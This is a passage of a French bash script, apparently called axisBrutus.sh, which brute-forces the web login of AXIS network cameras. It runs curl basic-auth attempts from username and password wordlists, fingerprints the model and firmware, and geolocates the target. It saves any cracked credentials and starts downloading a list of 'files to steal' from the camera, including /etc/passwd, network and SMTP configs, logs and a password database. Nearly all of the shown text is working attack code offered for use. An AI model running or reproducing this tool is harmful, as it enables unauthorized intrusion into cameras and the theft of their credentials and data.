0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKLSBBZmZpY2hlciBsYSBsaXN0ZSBkZXMgbW9kw6hsZXMgY29tcGF0aWJsZXMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1saXN0CgotIFBhcyBkZSBnw6lvbG9jYWxpc2F0aW9uCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbm8tZ2VvCgotIFBhcyBkZSBkw6l0ZWN0aW9uIGR1IG1vZMOobGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCi0gRGVmaW5pciB1bmUgbGlzdGUgZGUgbG9naW4gbW90LWRlLXBhc3NlCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tcGFzc3dvcmRzIC4vYXhpc19wYXNzLnR4dCAtLXVzZXJuYW1lcyAuL2F4aXNfdXNlcm5hbWVzLnR4dAoKLSBEw6lmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0IC0tdmVyYm9zZQoKLSBGaWNoaWVyIGxvZ3MgZCdhdHRhcXVlOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLWxvZyAuL3Rlc3QubG9nCgotIE1vZGUgdmVyYmV1eCA6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tdmVyYm9zZQoKLSBQYXJhbcOpdHJhZ2UgY3VybDoKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1tYXh0aW1lIDEwIC0tdGltZW91dCA0CgotIFBhcmFtw6l0cmFnZSBwaW5nOgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLXBpbmctdGltZW91dCA0CgotIElnbm9yZXIgbGUgcsOpc3VsdGF0IGR1IHBpbmc6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0taWdub3JlCgo="
	echo -e $banniere_aide$aide_texte|base64 -d
	}

#FUNCTION:
# verifie que les entetes sont presents
#DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE
#--------	--------	----------------	-----------	----------------------------------
function logEnteteCheck {
	premiere_ligne=$(head -n 1 $fichier_logs)
	
	if [[ "$premiere_ligne" =~ "IP:PORT" ]];then
		check='OK'
	else
		check='ERROR'
		echo -e "DATE		HEURE		IP:PORT			CATEGORIE	MESSAGE\n--------	--------	----------------	-----------	----------------------------------" > $fichier_logs
	fi
	
	#echo "{"$premiere_ligne"/"$check"}"
	}

#FUNCTION:
# verifie l'existence des fichiers
function logMessage {
	log_msg=$1 #message
	log_type=$2 #type: info, erreur, alerte...etc
	log_ip=$ip
	log_date=$(/bin/date "+%D")
	log_heure=$(/bin/date "+%T")
	log_taille_max_colonne=16
	log_taille_min_colonne=10
	
	if [ ${#log_ip} -lt $log_taille_max_colonne ];then
		log_ip="$log_ip\t"
	fi

	if [ ${#log_ip} -lt $log_taille_min_colonne ];then
		log_ip="$log_ip\t"
	fi

	log_ligne="$log_date\t$log_heure\t$log_ip\t$log_type\t$log_msg"	

	echo -e $log_ligne >> $fichier_logs
	}

function echox	{
	tput cuu1;tput el;echo -e "$1"
	}


function afficherBarre {
	#entiers
	fb_fait=$1
	fb_total=$2
	fb_total_txt="-$fb_total-"
	fb_total_t=$(( 10 ** ((${#fb_total_txt})-3) ))
	taille_barre=$taille_barre_progression
	#texte
	fb_barre=''
	#calcul: pourcentage fait : unites
	fb_pourcent_fait_pct=$(( ($fb_fait*100) / $fb_total ))
	fb_pourcent_fait_pct_txt=$(addZeros 100 $fb_pourcent_fait_pct)	
	fb_fait_txt=$(addZeros $fb_total_t $fb_fait)	
	fb_taille_barre_fait=$(( ($fb_pourcent_fait_pct*$taille_barre) / 100 ))
	#generation: barre de progression (à 100%)
	for x in $(seq 1 $taille_barre);do
		fb_barre=$fb_barre""$barre_car_fait""
	done


	#generation: textes
	txt_fait_sur_total="$fb_fait_txt/$fb_total" 	
	txt_fb_pourcent_fait_pct="$fb_pourcent_fait_pct_txt%"
	texte="[$txt_fb_pourcent_fait_pct][$txt_fait_sur_total]"
	#texte="[$txt_fb_pourcent_fait_pct]"
	#calcul: taille et position du texte (milieu de la barre)
	taille_txt=${#texte}
	pos_txt=$(( ($taille_barre-$taille_txt)/2 ))
	#generation: parties de la barre avant et apres le texte
	fb_barre_A=${fb_barre:0:$pos_txt}
	fb_barre_B=${fb_barre_A//$barre_car_fait/$barre_car_restant}
	#generation: (avant barre)+(texte)+(apres barre)
	fb_barre_texte="$fb_barre_A$texte$fb_barre_B"
	#generation: barre, partie "pourcent accomplie" (partie "faite")
	barres_fait=${fb_barre_texte:0:$fb_taille_barre_fait}
	#generation: barre, partie "pourcent restant" (partie "restante")
	nb_barres_restantes=$(( $taille_barre-$fb_taille_barre_fait ))
	barres_restantes=${fb_barre_texte:$fb_taille_barre_fait:$nb_barres_restantes}
	#barres_restantes=${barres_restantes//$barre_car_fait/$barre_car_restant}

	barre_progression=$barre_col_fait""$barres_fait""$barre_col_restant""$barres_restantes""
	barre_progression="$barre_progression\033[0m"
	
	echo -e $barre_progression
	}
####################################################################################################################
#                                                       ARGUMENTS
####################################################################################################################
#recuperation et traitement des arguments
for no_arg in $(seq 0 $nb_args); do
	valeur=${args[$no_arg]}
	if [ ${#valeur} -gt 0 ];then

		#parametre speciaux
		#affichage aide 
		if [ "$valeur" = "--help" ] || [ "$valeur" = "-h" ];then
			echo -e "$ab_titre \t-\t Ver. $ab_ver du $ab_date_maj"
			afficherAide
			exit
		fi
		#lister les modeles testés
		if [ "$valeur" = "--list" ] || [ "$valeur" = "-l" ];then
			echo -e "# Liste des modeles testés et validés: "${#liste_modeles_verifies[*]}" au total!"
			for mod in ${liste_modeles_verifies[*]}; do
				echo -e " - AXIS $mod Network Camera"
			done
			exit
		fi
		#sauter la verification du modele
		if [ "$valeur" = "--skip" ] || [ "$valeur" = "-s" ];then
			skipModeleDetect='OUI'
		fi

		#cible attaquée: ip, ip:port, url
		#parametre obligatoire
		if [ "$valeur" = "--cible" ] || [ "$valeur" = "-c" ];then
			ip=${args[$(($no_arg+1))]}
			ip=${ip/https:\/\//}
			ip=${ip/http:\/\//}
			ip=${ip//\//}
			ip_only=${ip%:*}
		fi
		#parametres optionnels

		#TARGETURI definie manuellement
		if [ "$valeur" = "--url" ] || [ "$valeur" = "-r" ];then
			urlforced='OUI'
			targeturi=${args[$(($no_arg+1))]}
			if [ "${targeturi:0:1}" = "/" ]; then
				url="http://$ip$targeturi"			
			else
				url="http://$ip/$targeturi"
			fi
		fi
		#wordlist usernames définie
		if [ "$valeur" = "--usernames" ] || [ "$valeur" = "-u" ];then
			users_wordlist=${args[$(($no_arg+1))]}
			nb_users=$(cat $users_wordlist|wc -l)
		fi
		#wordlist mdp définie
		if [ "$valeur" = "--passwords" ] || [ "$valeur" = "-p" ];then
			mdp_wordlist=${args[$(($no_arg+1))]}
			nb_mdp=$(cat $mdp_wordlist|wc -l)
		fi
		#fichier destination si mdp trouvé
		if [ "$valeur" = "--export" ] || [ "$valeur" = "--output" ] || [ "$valeur" = "-o" ];then
			exportforced='OUI'
			fichier_mdp_trouve=${args[$(($no_arg+1))]}
		fi
		#sauter la geolocalisation
		if [ "$valeur" = "--no-geo" ] || [ "$valeur" = "--nogeo" ] || [ "$valeur" = "-g" ];then
			skipGeo='OUI'
		fi
		#fichier logs
		if [ "$valeur" = "--log" ] || [ "$valeur" = "--logs" ];then
			fichier_logs=${args[$(($no_arg+1))]}
		fi
		#mode verbeux
		if [ "$valeur" = "--verbose" ] || [ "$valeur" = "-v" ] ;then
			modeVerbose='OUI'
		fi
		#Ignorer le test de connectivité
		if [ "$valeur" = "--ignore" ] || [ "$valeur" = "-i" ] ;then
			noPing='OUI'
		fi
		#parametres optionnels informatifs/pas d'attaques/quitte apres avoir executé l'option

		#configuration requetes http(curl) 
		if [ "$valeur" = "--timout" ] || [ "$valeur" = "-t" ];then
			curl_timeout=${args[$(($no_arg+1))]}
			if [ $curl_timeout -lt $min_timeout ];then
				curl_timeout=$min_timeout
			fi
		fi
		if [ "$valeur" = "--maxtime" ] || [ "$valeur" = "-m" ];then
			curl_maxtime=${args[$(($no_arg+1))]}
			if [ $curl_maxtime -lt $min_timeout ];then
				curl_maxtime=$min_timeout
			fi
		fi
		if [ "$valeur" = "--ping-timeout" ];then
			ping_timeout=${args[$(($no_arg+1))]}
			if [ $ping_timeout -lt $min_timeout ];then
				ping_timeout=$min_timeout
			fi
		fi
		#check
		if [ "$valeur" = "--check" ] || [ "$valeur" = "-k" ]; then
			skipModeleDetect='NON'
			checkOnly='OUI'
			skipGeo='OUI'
		fi
	fi
done

# si parametre check est passé en meme temps que skip (illogique)
#on impose le check dans ces cas là
if [ "$checkOnly" = "OUI" ];then
	skipModeleDetect='NON'
fi

#Si aucun cible n'est precisée : on quite en affichant un message d'erreur
if [ ${#ip} -eq 0 ];then
	echo -e "ERREUR!"
	echo -e " Vous devez specifier une cible avec l'argument '--cible ou -c'.\nExemple: $0 --cible 127.45.63.89"
	echo -e " Vous pouvez afficher l'aide avec l'argument '--help' ou '-h'."
	exit
fi

####################################################################################################################
#                                               VERFIFICATIONS FICHIERS
####################################################################################################################
liste_fichiers_a_verifier=( "$users_wordlist" "$mdp_wordlist" )

for fichier in ${liste_fichiers_a_verifier[*]}; do
	test_fichier=$(fichierExiste $fichier)
	if [ "$test_fichier" != 'OUI' ];then
		echo -e "$rouge>ERREUR: Le fichier suivant n'a pas été trouvé :\n$vert_fonce$italic$fichier"
		exit
	fi
done

#verifier si les entetes du fichier log existent deja ou pas
#echo -e "hey:"$(logEnteteCheck)
logEnteteCheck

#On calcul le nombre de probabilités si les fichiers  existent
nb_mdp=$(cat $mdp_wordlist|wc -l)
nb_users=$(cat $users_wordlist|wc -l)
nb_combinaisons=$(($nb_users*$nb_mdp))


####################################################################################################################
#                                                        START
####################################################################################################################
clear

if [ "$checkOnly" != "OUI" ];then
	logMessage "#################### Démarrage : $nb_combinaisons combinaisons possibles ####################" "INFORMATION" 
else
	logMessage "#################### Verifications uniquement : ####################" "INFORMATION" 
fi

#banniere
echo -en $rouge_fonce
echo -en $banniere|base64 -d


#Version
texte_ver="Version $ab_ver ¤"
espaces=$(ajouterEspacesSlogans "$texte_ver")
echo -e $rouge$espaces$texte_ver

#slogan
#texte_slogan="$ab_slogan$ab_ver"' Version '
#espaces=$(ajouterEspacesSlogans "$texte_slogan")
#echo -e $rouge_fonce' Version '$ab_ver$espaces$ab_slogan


#slogan V2
texte_slogan="$ab_slogan ¤"
espaces=$(ajouterEspacesSlogans "$texte_slogan")
echo -e $rouge_fonce$espaces$texte_slogan

#auteur
texte_auteur="Par $ab_auteur ¤"
espaces=$(ajouterEspacesSlogans "$texte_auteur")
echo -en $jaune_fonce
echo -e $espaces$texte_auteur

#mail
texte_mail="$ab_contact ¤"
espaces=$(ajouterEspacesSlogans "$texte_mail")
echo -en $vert_fonce
echo -e $espaces$texte_mail

#wab
texte_web="$ab_web ¤"
espaces=$(ajouterEspacesSlogans "$texte_web")
echo -en $cyan_fonce
echo -e $espaces$texte_web


####################################################################################################################
#                                            VERFIFICATIONS DES DEPENDENCES
####################################################################################################################

echo -e "$jaune_fonce\n$souligne"'VERFIFICATIONS DES DEPENDENCES:'$reset


echo -e "$jaune[+] Commandes : $cyan"
#curl
ping_existe=$(command -v ping)
curl_existe=$(command -v curl)
if [ ${#ping_existe} -gt 0 ];then
	ping_existe="OUI"
	echo -e "$jaune |_[-] Ping :$vert OK!"
else
	ping_existe="NON"
	echo -e "$jaune |_[-] Ping :$rouge NON!"
	echo -e "$jaune |  |_[-] Solution :$cyan apt install net-tools"
fi
if [ ${#curl_existe} -gt 0 ];then
	curl_existe="OUI"
	echo -e "$jaune |_[-] Curl :$vert OK!"
else
	curl_existe="NON"
	echo -e "$jaune |_[-] Curl :$rouge NON!"
	echo -e "$jaune |  |_[-] Solution :$cyan apt install curl"
fi

if [ "$ping_existe" != "OUI" ] || [ "$curl_existe" != "OUI" ] ;then
	echo -e "$jaune |_[-] Erreur :$rouge Dependences non satisfaites"
	echo -e "$jaune |_[-] Erreur :$rouge On quitte..."
	exit
fi
####################################################################################################################
#                                                     LISTE PARAMETRES
####################################################################################################################


echo -e "$jaune_fonce\n$souligne"'PARAMETRES:'$reset

echo -e "$jaune[+] Cible : $cyan$ip"
if [ "$checkOnly" != "OUI" ];then
	echo -e "$jaune[+] List des mot-de-passe:$cyan $mdp_wordlist $jaune"
	echo -e "$jaune[+] List des usernames:$cyan $users_wordlist $jaune"
	echo -e "$jaune[+] Total usernames:$cyan$nb_users"
	echo -e "$jaune[+] Total mot-de-passes:$cyan$nb_mdp"
	echo -e "$jaune[+] Nombre de combinaisons:$cyan"$nb_combinaisons
fi
if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
	echo -e "$jaune[+] TTL Requêtes HTTP: $cyan curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
fi

if [ "$skipModeleDetect" = "OUI" ];then
	echo -e "$jaune[+] Detection du modele:$cyan Désactivée"
fi

if [ $ping_timeout -ne $ping_timeout_default ];then
	echo -e "$jaune[+] Ping timeout:$cyan $ping_timeout"
fi

if [ "$noPing" = "OUI" ];then
	echo -e "$jaune[+] Test de connectivité:$cyan Ignorer le résultat du ping"
fi

if [ "$checkOnly" = "OUI" ];then
	echo -e "$jaune[+] Attaque désactivée:$cyan Verifications du modele uniquement"
fi

if [ "$urlforced" = "OUI" ];then
	echo -e "$jaune[+] URI imposée:$cyan $targeturi"
fi

if [ "$skipGeo" = "OUI" ];then
	echo -e "$jaune[+] Geolocalisation:$cyan Désactivée"
fi

if [ "$fichier_logs" != "$fichier_logs_defaut" ];then
	echo -e "$jaune[+] Fichier log:$cyan $fichier_logs"
fi


if [ "$checkOnly" != "OUI" ];then
	logMessage "Fichier usernames : $users_wordlist" "INFORMATION" 
	logMessage "Fichier mots-de-passe : $mdp_wordlist" "INFORMATION" 
fi
####################################################################################################################
#                                                 TEST DE CONNECTIVITE
####################################################################################################################

echo -e "$jaune_fonce\n$souligne"'TEST DE CONNECTIVITE:'$reset

echo -e "$jaune[+] Test en cours :$cyan ping $ip_only..."
test_connectivite=$(checkConnectiviteCible)
if [ "$test_connectivite" = "SUCCES" ];then
	echo -e "$jaune |_[-] Resultat :$vert OK!"
else
	logMessage "Ne repond pas au pings" "ERREUR!!!"
	echo -e "$jaune |_[-] Resultat :$rouge ECHEC!"
	if [ "$noPing" != "OUI" ];then
		echo -e "$jaune |_[-] Pas d'attaque à faire :$rouge On quitte"
		exit
	else
		echo -e "$jaune |_[-] On attaque quand même:$rouge On ignore le résultat du ping"
		logMessage "On ignore le résultat du ping" "ERREUR!!!"
		
	fi
fi
####################################################################################################################
#                                                       ANALYSE
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'ANALYSE:'$reset

#Informations sur la cibles
echo -en "$jaune[+] Modeles testés :$cyan"
echo -e "$cyan"${#liste_modeles_verifies[*]}"$cyan au total. $cyan_fonce(--list pour lister les modeles testés)"


#detection du modele  && [ "$checkOnly" != "OUI" ] 
if [ "$skipModeleDetect" = "OUI" ];then
	echo -e "$jaune[+] Detection du modele non effectuée car l'argument --skip (-s) a été passé! $cyan"
	logMessage "Detection du modèle : Désactivée" "ATTENTION" 
	modele_complet=$modele_nondetecte
else
	echo -e "$jaune[+] Detection du modele de la camera en cours...$cyan"
	logMessage "Detection du modele de la camera" "INFORMATION" 
	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
	echo -en "$jaune |_[-] Connexion en cours...$cyan"
	x_modele_complet=$(fullModeleDetect $ip)
	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	modele=${modele/.*[aA][xX][iI][sS]/axis}
	echo -e "$cyan terminé!\n"
	#echo -e $magenta$x_modele_complet
	if [ "$modele_complet" != "$modele_nondetecte" ]; then
		no_modele_recherche=0
		for mod in ${liste_modeles_verifies[*]}; do
			no_modele_recherche=$(( $no_modele_recherche+1 ))
			echox "$jaune |_[-] Détection en cours: "$(afficherBarre $no_modele_recherche ${#liste_modeles_verifies[*]} )""
			if [ "$mod" = "$modele" ];then
				modeles_verifie="OUI"
				break
			fi
		done
		echox "$jaune |_[-] Détection en cours:$cyan Terminée!"
		

		if [ "$modeles_verifie" = "OUI" ];then
			echo -e "$jaune |_[-] Modele:$cyan $modele $vert(testé et vérifié!) $jaune_fonce;)"
		else
			echo -e "$jaune |_[-] Modele:$cyan $modele $rouge(non testé!) $jaune_fonce:/"
		fi
	else
		echo -e "$magenta Le modele n'a pas été reconnu! $jaune_fonce:/"
	fi

	echo -en "$jaune[+] Detection de la version du firmware...$cyan"
	#version=$(versionDetect $modele_complet) #pb resultats erronés
	version=$(echo $modele_complet|rev|cut -d " " -f 1|rev)
	if [ "$version" != "N/A" ]; then
		version=$(echo $modele_complet|egrep -o [0-9.,].*)
	fi
	echo -e "$cyan terminé!"

fi


echo -en "$jaune[+] Cherche une URL à attaquer...$cyan"
if [ "$urlforced" != "OUI" ]; then 
	url=$(urlModele $ip $modele)
	if [ "$checkOnly" != "OUI" ];then
		logMessage "Recherche URL à attaquer" "INFORMATION" 
	fi
fi
echo -e "$cyan terminé!"


#La geolocalisation
if [ "$skipGeo" != "OUI" ];then
	echo -en "$jaune[+] Geolocalisation de la cible...$cyan"
	infosGeo_save=$(infosGeolocalisation $ip)
	infosGeo=$infosGeo_save
	infosGeoExport=$infosGeo_save
	if [ "$checkOnly" != "OUI" ];then
		logMessage "Geolocalisation" "INFORMATION" 
	fi
	echo -e "$cyan terminé!"
else
	if [ "$checkOnly" != "OUI" ];then
		logMessage "Geolocalisation" "INFORMATION" 
	fi
fi
if [ "$checkOnly" != "OUI" ];then
	#export...
	ip4file=${ip/:/-PORT_}
	fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
	fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
	if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
		echo -e "$jaune[+] Fichier export:$cyan $fichier_mdp_trouve $jaune"
	fi

	#prepas vars env et mise en forme 
	echo -en "$jaune[+] Préparation de l'environnement...$cyan"

	infosGeo=${infosGeo//':'/":$cyan"}
	infosGeo=${infosGeo//','/"\n$jaune |_[-]"}
	echo -e "$cyan terminé!"
fi

####################################################################################################################
#                                                       INFORMATIONS
####################################################################################################################
echo -e "$jaune_fonce\n$souligne"'INFORMATIONS:'$reset

echo -e "$jaune[+] IP:$cyan $ip"
echo -en "$jaune[+] Modele:$cyan $modele"
if [ ${#version} -gt 0 ]; then 
	echo -en "$cyan (Firmware ver. $magenta$version$cyan)"
else
	echo -en "$cyan "
fi


if [ "$checkOnly" = "OUI" ];then
	logMessage "Modele: $modele" "INFORMATION" 
	logMessage "Firmware: $version" "INFORMATION" 
fi

if [ "$modeles_verifie" = "OUI" ]; then 
	echo -e $cyan" ("$vert"modele reconnu"$cyan")"
	logMessage "Compatibilité: Modele verifié!" "INFORMATION" 
else
	echo -e $cyan" ("$rouge"modele non verifié"$cyan")"
	logMessage "Compatibilité: Modele non testé!" "INFORMATION" 
fi

echo -e "$jaune[+] URL Cible generée:$cyan $url"



if [ "$skipGeo" != "OUI" ];then
	if [ ${#infosGeo} -eq 0 ]; then infosGeo="Pas d'informations disponibles" ;fi
	echo -e "$jaune[+] Geolocalisation :"
	echo -en "$jaune |_[-] "$infosGeo""
fi
echo -e "$jaune"



####################################################################################################################
#                                                TRAITEMENT/ATTAQUE
####################################################################################################################

if [ "$checkOnly" != "OUI" ];then

	echo -e "$jaune_fonce\n$souligne"'TRAITEMENT:'$reset

	logMessage "Attaque en cours" "INFORMATION"
	 
	progression_pourcent=0
	while read user; do 
		while read mdp; do 
			requete_temps_A=$(/bin/date +%s)
			#avancement:
			total_fait=$(($total_fait+1))		
			total_fait_txt=$(addZeros $nb_combinaisons $total_fait)
			progression_pourcent=$(($total_fait*100/$nb_combinaisons))
			progression_pourcent_txt=$(addZeros 100 $progression_pourcent)		
			
			#debug mode: if [ $total_fait -gt 15 ]; then exit; fi

			
			#avancement:
			ligne_a_afficher="$jaune[$bleu_fonce$ip$jaune] [$magenta$total_fait_txt$jaune/$magenta_fonce$nb_combinaisons$jaune] [$vert_fonce$progression_pourcent_txt%$jaune] $user $jaune_fonce&$jaune $mdp : "
			#echo -en "$ligne_a_afficher"
			echo -en "$jaune[+] Attaque $jaune_fonce$jaune$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$jaune [$cyan$user$jaune:$cyan$mdp$jaune] "
			
			#Requete HTTP
			/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
			
			#pour debug rapide: if [ $total_fait -gt 5 ];then exit; fi
			
			#analyse de la reponse
			test_unauthorized=$(cat $tmp |grep --binary-files=text -i $echec)
			#echo "@test_unauthorized@=$test_unauthorized"
			test_javascript=$(cat $tmp |egrep --binary-files=text -i 'enable JavaScript')
			#echo "@test_javascript@=$test_javascript"
			test_administration=$(cat $tmp |egrep --binary-files=text -i 'administration tools')
			#echo "@test_administration@=$test_administration"
			test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
			#echo "@test_configuration@=$test_configuration"
			test_page400=$(cat $tmp |egrep --binary-files=text -i '<TITLE>400 ')
			test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 ')
			test_page500=$(cat $tmp |egrep --binary-files=text -i '<TITLE>500 ')
			#echo "@test_page404@=$test_page404"
			test_presence_lien_admin=$(cat $tmp |egrep --binary-files=text -i '/admin/users.shtml') #utile dans les cas javascript
			#echo "@test_presence_lien_admin@=$test_presence_lien_admin"

			#si le titre contien "unhotorized"
			if [ ${#test_unauthorized} -gt 0 ];then
				echo -e $rouge$msg_echec
			else			
				#sinon on a administration dans le titre de la page alors considere qu'on a passé la porte :D
				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
					echo -e $vert$msg_succes
					mdp_trouve='OUI'
					break
				else					
					#si pas de titre administration mais la page contient "enable javascript"
					if [ ${#test_javascript} -gt 0 ];then					
						if [ ${#test_presence_lien_admin} -gt 0 ];then
							echo -e $vert$msg_succes
							mdp_trouve='OUI'
							break
						else
							echo -e "$rouge$msg_echec: Necessite Javascript. Verifiez cette combinaison manuellement pour vérifier svp"
							echec_js="OUI"
							#echo -e $bleu;cat $tmp;echo -e $reset
							#break
						fi
					#si pas la page admiistration et pas de message JS
						
					else
						#si page 404
						if [ ${#test_page400} -gt 0 ] || [ ${#test_page404} -gt 0 ] || [ ${#test_page500} -gt 0 ];then
														
							echo -e "$rouge$msg_echec: Page introuvable. Forcez l'URL avec l'argument \"--url /admin/users.shtml\" $jaune_fonce:/"
							echec_404="OUI"
							break
						#sinon ok?
						else				
							echo -e $vert$msg_succes
							mdp_trouve="OUI"
							break
						fi
						
					fi

				fi
			fi

			if [ "$modeVerbose" != 'OUI' ];then
				tput cuu1;tput el
			fi

			requete_temps_B=$(/bin/date +%s)
			top_timer=$(( $(/bin/date +%s) -$heure_depart))
		done < $mdp_wordlist

		#on check si on a trouvé un mdp afin de ne pas tester plus de usernames
		if [ "$mdp_trouve" = "OUI" ] ; then
			break
		fi
		#if [ "$echec_js" = "OUI" ]; then
		#	break
		#fi
		if [ "$echec_404" = "OUI" ]; then
			break
		fi
	done < $users_wordlist
fi

heure_fin=$(/bin/date +%s)
heure_duree_totale=$(($heure_fin-$heure_depart-3600))
duree_totale=$(/bin/date -d @$heure_duree_totale +%H:%M:%S)
####################################################################################################################
#                                    			BRAVO OU PAS ?
####################################################################################################################

if [ "$checkOnly" != "OUI" ] ; then
	if [ "$mdp_trouve" = "OUI" ] ; then
		message_fin="Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. "

		#echo -e "$jaune |_[-] Succes: $cyan$message_fin"
		tput cuu1;tput el;echo -e "$jaune[+] Attaque $ip:$vert Succes!$cyan $message_fin"
		echo -e "$jaune |_[-] Login: $user"
		echo -e "$jaune |_[-] Mot-de-passe: $mdp"
		echo -e $vert
		echo -e $banniere_bravo|base64 -d
		echo -e $ab_slogan_bravo
		echo -e $reset
		logMessage "$message_fin" "P4WN3D!!!"
	else
		message_fin="Le mot-de-passe n'a pas été trouvé apres $total_fait combinaisons, soit "$top_timer"s d'attaque!" 
		echo -e "$jaune[+] Attaque $ip: $cyan$message_fin"
		echo -e $rouge
		echo -e $banniere_tryagain|base64 -d
		echo -e $ab_slogan_defaite
		echo -e $reset
		logMessage "$message_fin" "DOMMAGE!!!"
	fi
fi
####################################################################################################################
#                                    SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne""SYNTHESE DES DONNEES POUR l'EXPORT:"$reset
	echo -en "$jaune[+] En cours..."
	
	export_donnes='INFORMATIONS IDENTIFICATION:'
	export_donnes=$export_donnes"\n - LOGIN: $user"
	export_donnes=$export_donnes"\n - MOT-DE-PASSE: $mdp"

	export_donnes=$export_donnes'\n\nINFORMATIONS CAMERA:'
	if [ "$exportforced" = "OUI" ];then
		export_destination="$fichier_mdp_trouve"
	else
		echo $(mkdir "$dossier_mdps" 2>&1) 1>/dev/null
		export_destination="$dossier_mdps/$fichier_mdp_trouve"
	fi

	export_donnes=$export_donnes"\n - IP: $ip"
	export_donnes=$export_donnes"\n - Modele: $modele"

	if [ ${#version} -gt 0 ]; then 
		export_donnes=$export_donnes" (Firmware ver. $version)"
	else
		export_donnes=$export_donnes""
	fi
	if [ "$modeles_verifie" = "OUI" ]; then 
		export_donnes=$export_donnes" (modele reconnu)"
	else
		export_donnes=$export_donnes" (modele non verifié)"
	fi

	export_donnes=$export_donnes"\n - URL Cible generée: $url"
	if [ "$skipGeo" != "OUI" ];then
		if [ ${#infosGeoExport} -eq 0 ]; then infosGeoExport="Pas d'informations disponibles" ;fi
		export_donnes=$export_donnes"\n - Geolocalisation :\n\t- "
		#infosGeo=${infosGeoExport//':'/":"}
		export_donnes=$export_donnes" "${infosGeoExport//','/"\n\t- "}""
	fi

	export_donnes=$export_donnes'\n\nINFORMATIONS ATTAQUE:'
	export_donnes=$export_donnes"\n - Date: "$(/bin/date "+%c")
	export_donnes=$export_donnes"\n - Durée: "$duree_totale
	export_donnes=$export_donnes"\n - Départ de l'attaque: "$(/bin/date -d @$heure_depart )
	export_donnes=$export_donnes"\n - Nombre tentatives: "$total_fait" sur un total de "$nb_combinaisons
	export_donnes=$export_donnes"\n - Fin de l'attaque: "$(/bin/date -d @$heure_fin )
	export_donnes=$export_donnes"\n - Fichier usernames utilisé: "$users_wordlist" ($nb_users usernames)"
	export_donnes=$export_donnes"\n - Fichier mot-de-passe utilisé: "$mdp_wordlist" ($nb_mdp mot-de-passe)"
	if [ "$skipModeleDetect" = 'OUI' ];then
		export_donnes=$export_donnes"\n - La détection du modèle a été ignorée : L'argument \"--skip\" (ou équivalent) a été passé."
	fi
	if [ "$skipGeo" = 'OUI' ];then
		export_donnes=$export_donnes"\n - La géolocalisation a été ignorée : L'argument \"--no-geo\" (ou équivalent) a été passé."
	fi

	echo -e "$cyan terminé!"
fi

####################################################################################################################
#                                             TELECHARGEMENT DE FICHIERS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'TELECHARGEMENT DE FICHIERS:\n'$reset
	fichiers_a_voler=('/etc/passwd' '/etc/group' '/etc/applications/config_cam1' '/etc/network/network.conf' '/etc/resolv.conf' '/etc/sftpd.banner' '/var/log/messages' '/var/log/messages.old' '/etc/sysconfig/id.conf' '/etc/sysconfig/appwiz.conf' '/etc/sysconfig/systime.conf' '/etc/sysconfig/isp.conf' '/etc/sysconfig/brand.conf' '/etc/sysconfig/smtp.conf' '/etc/sysconfig/image.conf' '/etc/sysconfig/dst.conf' '/etc/sysconfig/layout.conf' '/etc/httpd/conf/boa.conf' '/etc/pwdb.conf' )
	nb_fichiers_a_voler=${#fichiers_a_voler[@]}
	no_fichier=0
	temp_vole='/tmp/export_vole.txt'

	export_donnes=$export_donnes'\n\nFICHIERS:'
	logMessage "Telechargement des fichiers" "INFORMATION" 
	for fichier_x in ${fichiers_a_voler[*]}; do
		no_fichier=$(( $no_fichier+1 ))
		#logMessage "Telechargement : $fichier_x" "INFORMATION" 
			
		if [ "$modeVerbose" != 'OUI' ];then
			tput cuu1;tput el
		fi
		
		#affichage a l'ecran
